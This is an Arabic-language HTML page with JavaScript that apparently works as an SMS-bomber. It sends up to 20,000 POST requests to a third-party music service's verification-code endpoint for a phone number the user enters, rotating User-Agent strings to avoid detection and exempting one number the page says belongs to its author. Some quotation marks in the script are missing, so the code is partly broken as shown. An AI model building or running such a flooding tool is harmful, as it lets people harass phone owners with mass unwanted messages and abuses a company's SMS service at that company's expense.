<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>إرسال الأكواد - RTT</title>
<style>
  body, html {
    margin: 0;
    padding: 0;
    height: 100%;
    overflow: hidden;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    background: black;
    color: white;
  }
  video#bgVideo {
    position: fixed;
    right: 0;
    bottom: 0;
    min-width: 100%;
    min-height: 100%;
    z-index: -1;
  }
  .container {
    background: rgba(0,0,0,0.6);
    padding: 30px;
    border-radius: 15px;
    text-align: center;
    box-shadow: 0 0 20px red;
    width: 90%;
    max-width: 400px;
  }
  input, button {
    padding: 10px;
    margin: 10px 0;
    width: 80%;
    border-radius: 8px;
    border: none;
    font-size: 1rem;
  }
  button {
    background: red;
    color: white;
    cursor: pointer;
    box-shadow: 0 0 10px red;
    transition: 0.2s;
  }
  button:hover {
    box-shadow: 0 0 20px red, 0 0 30px red;
  }
  h2, p {
    margin: 10px 0;
    text-shadow: 0 0 10px red;
  }
  .counter {
    font-size: 1.2rem;
    margin: 10px 0;
    text-shadow: 0 0 10px red;
    animation: neon 1.5s infinite alternate;
  }
  .current-msg {
    font-size: 1rem;
    margin: 5px 0;
    min-height: 20px;
    text-shadow: 0 0 10px red;
  }
  .footer {
    margin-top: 20px;
    text-shadow: 0 0 10px red;
  }

  @keyframes neon {
    0% { text-shadow: 0 0 5px red, 0 0 10px red; }
    50% { text-shadow: 0 0 15px red, 0 0 30px red; }
    100% { text-shadow: 0 0 5px red, 0 0 10px red; }
  }
</style>
</head>
<body>

<video autoplay muted loop id="bgVideo">
  <source src="rtt.mp4" type="video/mp4">
</video>

<div class="container">
  <h2>أرسل الأكواد من شركتنا</h2>
  <input type="text" id="userNumber" placeholder="أدخل رقم المستخدم">
  <input type="number" id="smsCount" placeholder="عدد الرسائل (10-20000)" min="10" max="20000">
  <button id="sendBtn">إرسال</button>
  <button id="resetBtn" style="display:none;">إعادة الإرسال</button>

  <div class="counter">
    ✅ ناجح: <span id="successCount">0</span>  
    ❌ فشل: <span id="failureCount">0</span>
  </div>

  <div class="current-msg" id="currentMsg"></div>
  <p id="thankMsg" style="display:none;">شكرا لاستخدامك 🥹🫶🏼</p>

  <div class="footer">© جميع الحقوق محفوظة لد روني البحيره 2025</div>
</div>

<script>
const sendBtn = document.getElementById( sendBtn );
const resetBtn = document.getElementById( resetBtn );
const successCountElem = document.getElementById( successCount );
const failureCountElem = document.getElementById( failureCount );
const currentMsgElem = document.getElementById( currentMsg );
const thankMsg = document.getElementById( thankMsg );

// قائمة الأرقام الممنوعة
const blockedNumbers = ["01212843252"];

const API_URL = "https://api.twistmena.com/music/Dlogin/sendCode";
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
];

async function sendMessages(number, count) {
    let success = 0;
    let failure = 0;
    successCountElem.textContent = success;
    failureCountElem.textContent = failure;
    thankMsg.style.display = "none";
    resetBtn.style.display = "none";

    for(let i=1; i<=count; i++){
        currentMsgElem.textContent = `جارِ إرسال الرسالة ${i}...`;
        const payload = { dial: "2" + number };
        const headers = { "Content-Type": "application/json", "User-Agent": userAgents[Math.floor(Math.random()*userAgents.length)] };

        try {
            const res = await fetch(API_URL, { method: "POST", headers: headers, body: JSON.stringify(payload) });
            const data = await res.json();
            if(data.responseHeader && data.responseHeader.status){
                success++;
            } else {
                failure++;
            }
        } catch(err){
            failure++;
        }
        successCountElem.textContent = success;
        failureCountElem.textContent = failure;
        await new Promise(r => setTimeout(r, 1000));
    }

    currentMsgElem.textContent = "";
    thankMsg.style.display = "block";
    resetBtn.style.display = "inline-block";
}

sendBtn.addEventListener( click , () => {
    const number = document.getElementById( userNumber ).value.trim();
    let count = parseInt(document.getElementById( smsCount ).value);

    if(!number || isNaN(count)){
        alert("يرجى إدخال الرقم وعدد الرسائل");
        return;
    }

    if(blockedNumbers.includes(number)){
        alert(`❌ ممنوع الإرسال للرقم ${number} لأنه خاص بالشركة!`);
        return;
    }

    if(count < 10) count = 10;
    if(count > 20000) count = 20000;

    sendMessages(number, count);
});

resetBtn.addEventListener( click , () => {
    document.getElementById( userNumber ).value =   ;
    document.getElementById( smsCount ).value =   ;
    successCountElem.textContent =  0 ;
    failureCountElem.textContent =  0 ;
    thankMsg.style.display = "none";
    resetBtn.style.display = "none";
});
</script>

</body>
</html>
